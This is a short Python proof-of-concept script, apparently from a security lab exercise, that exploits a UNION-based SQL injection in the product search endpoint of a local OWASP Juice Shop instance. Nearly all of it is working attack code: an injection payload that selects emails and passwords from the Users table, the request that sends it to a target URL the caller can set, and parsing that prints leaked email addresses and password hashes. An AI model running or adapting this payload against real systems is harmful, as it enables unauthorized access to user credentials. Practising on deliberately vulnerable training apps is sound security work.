
#!/usr/bin/env python3
"""
JUICE-002: SQL Injection - UNION-based Data Extraction

Purpose:
Demonstrate how an SQL injection vulnerability in the
Juice Shop product search can expose unintended user data.

Target endpoint:
GET /rest/products/search?q=

Payload:
Based on the UNION injection used during my lab testing.

Authorized testing on my local Juice Shop instance only.
"""

import requests
import sys

# Set the Juice Shop URL.
# A custom URL can be supplied when running the script.
BASE_URL = (
    sys.argv[1]
    if len(sys.argv) > 1
    else "http://localhost:3000"
)

# UNION-based SQL injection payload used in my lab attempt.
PAYLOAD = (
    "qwert')) UNION SELECT id, email, password, "
    "'4','5','6','7','8','9' FROM Users--"
)


def main():
    # Product search API endpoint
    endpoint = f"{BASE_URL}/rest/products/search"

    print("Testing JUICE-002: UNION-based SQL Injection")
    print("Endpoint:", endpoint)

    try:
        # Send the search request with the injection payload.
        response = requests.get(
            endpoint,
            params={"q": PAYLOAD},
            timeout=15
        )

        print("HTTP Status:", response.status_code)

        # Check whether the server accepted the request.
        if response.status_code != 200:
            print("Request failed.")
            print("Server response:", response.text[:300])
            return 1

        # Convert the JSON response into Python data.
        results = response.json()
        rows = results.get("data", [])

        print("Number of returned rows:", len(rows))

        # Look for email-like values in the returned product names.
        leaked_records = []

        for row in rows:
            name = row.get("name", "")
            description = row.get("description", "")

            if isinstance(name, str) and "@" in name:
                leaked_records.append((name, description))

        # Display a limited number of matching records.
        print("Matching credential records:", len(leaked_records))

        for email, password_hash in leaked_records[:5]:
            print("Email:", email)
            print("Password hash:", password_hash)
            print("-------------------------")

        if leaked_records:
            print("JUICE-002 reproduction: matching records found.")
            return 0

        print("No matching records detected in this response.")
        return 1

    except requests.RequestException as error:
        print("Connection error:", error)
        return 1


if __name__ == "__main__":
    raise SystemExit(main())
